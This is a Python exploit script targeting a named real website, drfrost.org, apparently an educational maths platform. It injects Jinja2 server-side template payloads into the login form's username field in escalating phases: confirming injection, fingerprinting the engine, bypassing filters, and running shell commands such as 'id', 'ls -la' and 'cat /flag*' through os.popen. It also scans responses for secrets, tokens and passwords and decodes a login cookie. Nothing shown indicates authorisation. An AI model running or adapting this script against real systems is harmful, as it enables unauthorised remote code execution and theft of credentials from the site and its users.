#!/usr/bin/env python3
"""
SSTI RCE Exploit Test for DrFrost.org
Tests Jinja2 SSTI payloads to escalate from template injection to RCE
"""
import requests
import re
import base64
import json
import sys

BASE_URL = "https://www.drfrost.org"

def get_login_page():
    """Get fresh login page and extract tokens"""
    session = requests.Session()
    r = session.get(f"{BASE_URL}/login?index", timeout=30)
    html = r.text
    
    # Extract idempotencyKey
    # Pattern: name="idempotencyKey" value="..."
    key_match = re.search(r'name="idempotencyKey" value="([^"]+)"', html)
    idempotency_key = key_match.group(1) if key_match else None
    
    # Get cookies
    cookies = dict(session.cookies)
    
    print(f"[+] Status: {r.status_code}")
    print(f"[+] idempotencyKey: {idempotency_key}")
    print(f"[+] Cookies: {cookies}")
    
    return session, idempotency_key, html

def test_ssti_payload(session, payload):
    """Test a single SSTI payload via POST to /login"""
    _, idempotency_key, _ = get_login_page()
    if not idempotency_key:
        print("[-] No idempotencyKey found!")
        return None
    
    data = {
        "idempotencyKey": idempotency_key,
        "username": payload,
        "provider": "drfrost"
    }
    
    r = session.post(f"{BASE_URL}/login", data=data, timeout=30, allow_redirects=False)
    
    print(f"\n{'='*60}")
    print(f"[+] TESTING: {payload[:80]}")
    print(f"[+] Status: {r.status_code}")
    print(f"[+] Location: {r.headers.get('Location', 'N/A')}")
    
    # Check body for SSTI reflection
    body_lower = r.text.lower()
    # Look for our payload or computed values
    if payload in r.text:
        print(f"[!] Payload reflected literally in body!")
    
    # Check for computed values
    if "49" in r.text and "7*7" in payload:
        print(f"[!] '49' found in response - SSTI CONFIRMED!")
        # Find context
        idx = r.text.find("49")
        print(f"[!] Context: ...{r.text[max(0,idx-50):idx+50]}...")
    
    if "secret" in body_lower or "env" in body_lower or "key" in body_lower:
        print(f"[!] Potential data leak detected!")
        for line in r.text.split('\n'):
            if any(x in line.lower() for x in ['secret', 'key', 'env', 'password', 'token']):
                print(f"[!]  {line.strip()[:200]}")
    
    # Check cookies
    for cookie_name, cookie_value in dict(session.cookies).items():
        print(f"[+] Cookie: {cookie_name} = {cookie_value[:100] if cookie_value else 'EMPTY'}")
        if cookie_name == "_df_login_alert" and cookie_value:
            try:
                decoded = base64.urlsafe_b64decode(cookie_value + '==').decode()
                print(f"[!] Decoded _df_login_alert: {decoded[:500]}")
            except:
                print(f"[!] Raw _df_login_alert: {cookie_value[:200]}")
    
    # Print first response characters that show reflection
    body_text = r.text[:3000]
    print(f"[+] Body preview: {body_text[:500]}...")
    
    return r.text

# Main test sequence
print("="*60)
print("SSTI RCE EXPLOIT - DRFROST.ORG")
print("="*60)

session = requests.Session()

# Phase 1: Confirm SSTI with basic math
payloads_basic = [
    "{{7*7}}",
    "{{99*99}}",
    "{{2+2}}",
]

print("\n>>> PHASE 1: Confirm SSTI <<<")
for p in payloads_basic:
    result = test_ssti_payload(session, p)
    if result and "49" in result:
        break

# Phase 2: Identify template engine
payloads_identify = [
    "{{config}}",
    "{{self}}",
    "{{dict}}",
    "{{request}}",
]

print("\n>>> PHASE 2: Identify Template Engine <<<")
for p in payloads_identify:
    result = test_ssti_payload(session, p)

# Phase 3: Test blocked patterns
payloads_blocked_test = [
    "{{''.__class__}}",
    "{{''["__class__"]}}",
    "{{()|attr('__class__')}}",
    "{}" + "{% if True %}YES{% endif %}",
]

print("\n>>> PHASE 3: Test Blocked Patterns <<<")
for p in payloads_blocked_test:
    test_ssti_payload(session, p)

# Phase 4: RCE escalation attempt
payloads_rce = [
    "{{config.__class__.__init__.__globals__}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('cat /flag*').read()}}",
    "{{namespace.__init__.__globals__.os.popen('ls -la').read()}}",
]

print("\n>>> PHASE 4: RCE Escalation <<<")
for p in payloads_rce:
    test_ssti_payload(session, p)

print("\n" + "="*60)
print("DONE - Check /tmp/ssti_rce_results.txt for full output")
print("="*60)
